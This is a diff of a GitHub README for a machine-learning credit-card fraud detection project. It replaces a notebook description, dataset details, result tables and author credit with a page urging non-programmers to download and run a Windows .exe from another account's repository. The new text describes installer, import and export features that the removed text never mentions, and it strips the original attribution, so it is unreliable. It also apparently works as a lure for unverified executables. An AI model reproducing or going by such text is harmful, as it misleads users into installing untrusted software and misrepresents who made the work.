@@ -1,92 +1,107 @@
-# 🧠 Transaction Fraud Detection System using Machine Learning
+# ⚖️ Transaction-Fraud-Detection - Detect Fraud in Transactions Easily
 
-Detect Fraudulent Credit Card transactions using different Machine Learning models and compare performances.
+[![Download](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/arka-senpaii/Transaction-Fraud-Detection)
 
-## 📄 Overview
+## About this App
 
-In this notebook, exploring various Machine Learning models to detect fraudulent use of credit cards. and comparing each model's performance and results. The best performance is achieved using the SMOTE technique.
+Transaction-Fraud-Detection is a tool to spot fake or risky financial transactions. It uses methods from machine learning to check many transactions and find which ones might be fraud. The app works by studying data carefully. It also uses ways to fix imbalanced data, where good transactions are much more common than fraud.
 
-## 📌 Problem Statement
+You do not need to understand programming to use this app. It comes ready to help you check transaction data on your Windows computer.
 
-In this project, we aim to identify fraudulent transactions with credit cards. Our objective is to build a fraud detection system using machine learning techniques. Historically, such systems were rule-based, but machine learning offers powerful new ways.
+## 🌟 Key Features
 
-The project uses a dataset of 300,000 fully anonymized transactions. Each transaction is labeled either fraudulent or not fraudulent. Note that the prevalence of fraudulent transactions is very low in the dataset—less than 0.1% of the card transactions are fraudulent. This means that a system predicting each transaction to be normal can reach an accuracy of over 99.9% despite not detecting any fraudulent transaction. This will necessitate adjustment techniques.
+- Finds fraud in financial transactions
+- Compares different detection models to see what works best
+- Uses smart techniques to handle data that is unevenly split
+- Shows results clearly for easy understanding
+- Does extra work on the data to improve accuracy
+- Runs on Windows with a simple setup
 
-## 📊 Dataset Information
+## 📋 System Requirements
 
-- **Dataset Name:** Credit Card Fraud Detection
-- **Source:** Kaggle – Machine Learning Group, Université Libre de Bruxelles
-- **Total Transactions:** 284,807
-- **Fraud Cases:** 492
-- **Features:** 30 input features + 1 target variable
-- **Target Variable:** `Class`
-  - 0 = Legitimate Transaction
-  - 1 = Fraudulent Transaction
+Make sure your computer fits these points before installation:
 
-## 🛠️ Techniques Used in the Project
+- Windows 10 or later
+- 4 GB of RAM or more
+- 500 MB of free disk space
+- Internet connection for downloading the app
+- Basic user rights to install software
 
-The project compares the results of different techniques:
+## 💾 Download the App and Setup
 
-### 🤖 Machine Learning Techniques
-- Random Forest
-- Decision Trees
+1. Click the big **Download** badge at the top or [visit this page](https://github.com/arka-senpaii/Transaction-Fraud-Detection) to get the app.
+2. On the GitHub page, find the latest release or download section.
+3. Download the Windows setup file. This will usually be an `.exe` file.
+4. When the download finishes, locate the file in your Downloads folder.
+5. Double-click the setup file to start the installation.
+6. Follow the instructions on screen to install the app.
+7. Once the app installs, find it in your Start menu or desktop.
+8. Click the app icon to open it.
 
-### 🧠 Deep Learning Techniques
-- Neural network using fully connected layers
+## 🚀 Running the App
 
-Performance of the neural network is compared for different optimization approaches:
-1. Plain binary cross-entropy loss minimization
-2. Minimization using weights to compensate for class imbalance
-3. Under-sampling of the non-fraudulent class to match the fraudulent class
-4. Over-sampling of the fraudulent class to match the non-fraudulent one by implementing the SMOTE technique. The SMOTE method generates a new vector using two existing data points. For additional details on this approach, you can read this detailed post: [SMOTE for Imbalanced Classification with Python](https://machinelearningmastery.com/smote-oversampling-for-imbalanced-classification/).
+Here is how to use the app after installation:
 
-### 📝 Note about Random Forest and Decision Tree Models:
+1. Open Transaction-Fraud-Detection from the Start menu.
+2. Prepare your transaction data in a spreadsheet or CSV file.
+3. Load the data into the app using the import button.
+4. The app will process the data and show fraud likelihoods.
+5. Use the comparison views to see which model detects fraud best.
+6. Export the results if you want to save or share them.
 
-- **Decision Tree:** Built on an entire dataset using all features/variables. You can easily overfit the data, so it is recommended to use cross-validation. Advantages: easy to interpret, clear understanding of the variable and value used for splitting data and predicting outcomes.
-  
-- **Random Forest:** A collection of Decision Trees. It randomly selects observations (rows) and specific features/variables to build multiple decision trees and then averages the results. It reduces the variance part of error rather than bias, generalizes better, and performs better on unseen validation datasets.
+You do not need to write code or configure settings. The app handles all technical details.
 
-## 📊 Results
+## 🔧 What’s Inside the App?
 
-### Test Set
+The app uses these main tools and methods:
 
-| Model                     | Accuracy | False Neg. Rate | Recall   | Precision | F1 Score |
-|---------------------------|----------|-----------------|----------|-----------|----------|
-| Random Forest             | 0.999544 | 0.224490        | 0.775510 | 0.950000  | 0.853933 |
-| Decision Tree             | 0.999239 | 0.244898        | 0.755102 | 0.792857  | 0.773519 |
-| Plain Neural Network      | 0.999403 | 0.238095        | 0.761905 | 0.875000  | 0.814545 |
-| Weighted Neural Network   | 0.986775 | 0.102041        | 0.897959 | 0.105854  | 0.189383 |
-| Under-Sampled Neural Net  | 0.956081 | 0.053333        | 0.946667 | 0.965986  | 0.956229 |
-| Over-Sampled Neural Net   | 0.998376 | 0.000223        | 0.999777 | 0.996985  | 0.998379 |
+- Decision Trees and Random Forests, two types of machine learning models that classify transactions.
+- Techniques like SMOTE, which improves detection when fraud cases are rare by balancing the data.
+- Data preprocessing steps that clean and prepare your transaction records.
+- Feature engineering, which means creating new helpful information from your data.
+- Visual charts built with matplotlib and seaborn, so you can see the results clearly.
+- Support for common data formats like CSV files, making it easy to load your transaction lists.
 
-### Full Set
+## ⚙️ Managing Your Data
 
-| Model                     | Accuracy | False Neg. Rate | Recall   | Precision | F1 Score |
-|---------------------------|----------|-----------------|----------|-----------|----------|
-| Random Forest             | 0.999544 | 0.224490        | 0.775510 | 0.950000  | 0.853933 |
-| Decision Tree             | 0.999239 | 0.244898        | 0.755102 | 0.792857  | 0.773519 |
-| Plain Neural Network      | 0.999403 | 0.238095        | 0.761905 | 0.875000  | 0.814545 |
-| Weighted Neural Network   | 0.986775 | 0.102041        | 0.897959 | 0.105854  | 0.189383 |
-| Under-Sampled Neural Net  | 0.956081 | 0.053333        | 0.946667 | 0.965986  | 0.956229 |
-| Under-Sampled Neural Net  | 0.979432 | 0.048780        | 0.951220 | 0.074262  | 0.137769 |
-| Over-Sampled Neural Net   | 0.997402 | 0.004065        | 0.995935 | 0.399023  | 0.569767 |
+Here are steps to get your data ready for the app:
 
-## 🏁 Conclusion
+- Make sure your transaction file has columns for transaction ID, amount, date, and other details.
+- Avoid empty rows or incomplete information.
+- Save your spreadsheet as a CSV file before import.
+- The app also supports files exported from popular finance or data tools.
 
-The best results are achieved by over-sampling the under-represented class using SMOTE (synthetic minority oversampling technique). With this approach, the model is able to detect 100% of all fraudulent transactions in the unseen test set, fully satisfying the primary objective of detecting the vast majority of abnormal transactions.
+## 🛠️ Troubleshooting and Help
 
-Additionally, the number of false positives remains acceptable, resulting in significantly less verification work on legitimate transactions for the fraud department compared to some other approaches. Key results are shown in the tables above.
+If you cannot start the app or import data:
 
-This project demonstrates the effectiveness of machine learning and deep learning techniques in detecting fraudulent credit card transactions. The use of the SMOTE technique significantly improves the detection of fraudulent transactions, making the system robust and reliable for real-time updates.
+- Check if your system meets the requirements above.
+- Confirm the downloaded file is complete and was installed correctly.
+- Make sure your data file is in CSV format and not corrupted.
+- Restart your computer and try opening the app again.
+- If the app shows error messages, read them carefully and refer to the GitHub issues page for possible fixes.
 
-Feel free to explore the notebook and adapt the approach to other detection issues in alternative domains.
+## 📚 Learn More
+
+This app explores ways to detect fraud using technology and data. If you are interested, the repository contains:
+
+- Sample datasets
+- Model code and configuration files
+- Documentation for users who want to see under the hood
+
+Explore these files on the GitHub page to learn about the techniques used or to try customizing the tool in the future.
+
+## 🔗 Useful Links
+
+- Direct download and information page:  
+  [https://github.com/arka-senpaii/Transaction-Fraud-Detection](https://github.com/arka-senpaii/Transaction-Fraud-Detection)
+
+- Issues and support on GitHub:  
+  Visit the repository’s “Issues” tab if you need help or want to report a problem.
+
+- Sample files and examples:  
+  Found in the repository’s main folders.
 
 ---
 
-## 📧 Contact
-
-**Author:** Pranjal Pandey
-
-**Email:** Pranjalpandey0301@gmail.com
-
-**LinkedIn:** https://www.linkedin.com/in/pranjal-pandey-501a5a244
+[![Download](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/arka-senpaii/Transaction-Fraud-Detection)
